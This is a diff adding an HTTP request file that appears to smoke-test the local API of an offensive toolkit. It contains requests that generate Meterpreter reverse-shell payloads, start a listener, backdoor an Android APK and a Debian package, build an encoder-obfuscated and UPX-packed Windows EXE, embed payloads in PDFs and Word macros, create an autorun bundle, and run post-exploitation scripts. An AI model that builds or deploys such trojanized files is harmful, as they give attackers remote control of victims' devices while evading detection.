@@ -1,0 +1,80 @@
+### Payload EXE
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "payload",
+  "params": {"payload":"windows/meterpreter/reverse_tcp","lhost":"127.0.0.1","lport":"4444","output_name":"smoke_payload"}
+}
+
+### Listener
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "listener",
+  "params": {"payload":"windows/meterpreter/reverse_tcp","lhost":"0.0.0.0","lport":"4455"}
+}
+
+### Android (backdoor_apk)
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "android",
+  "params": {"mode":"backdoor_apk","payload":"android/meterpreter/reverse_tcp","lhost":"127.0.0.1","lport":"4444","perm_strategy":"keep","output_name":"smoke_apk"}
+}
+
+### Windows EXE (winexe)
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "winexe",
+  "params": {"payload":"windows/meterpreter/reverse_tcp","lhost":"127.0.0.1","lport":"4444","arch":"x86","output_name":"smoke_win","encoders":"x86/shikata_ga_nai:3","upx":"true"}
+}
+
+### PDF Embedded
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "pdf",
+  "params": {"payload":"windows/meterpreter/reverse_tcp","lhost":"127.0.0.1","lport":"4444","output_name":"smoke_pdf"}
+}
+
+### Office Macro
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "office",
+  "params": {"suite_target":"ms_word_windows","payload":"windows/meterpreter/reverse_tcp","lhost":"127.0.0.1","lport":"4444","output_name":"smoke_doc"}
+}
+
+### Debian Package
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "deb",
+  "params": {"deb_path":"/path/to/file.deb","lhost":"127.0.0.1","lport":"4444","output_name":"smoke_deb"}
+}
+
+### Autorun Bundle
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "autorun",
+  "params": {"exe_path":"","exe_name":"app4.exe"}
+}
+
+### Post-Exploitation
+POST http://127.0.0.1:8000/tasks
+Content-Type: application/json
+
+{
+  "kind": "postex",
+  "params": {"script_name":"sysinfo.rc","session_id":"1"}
+}
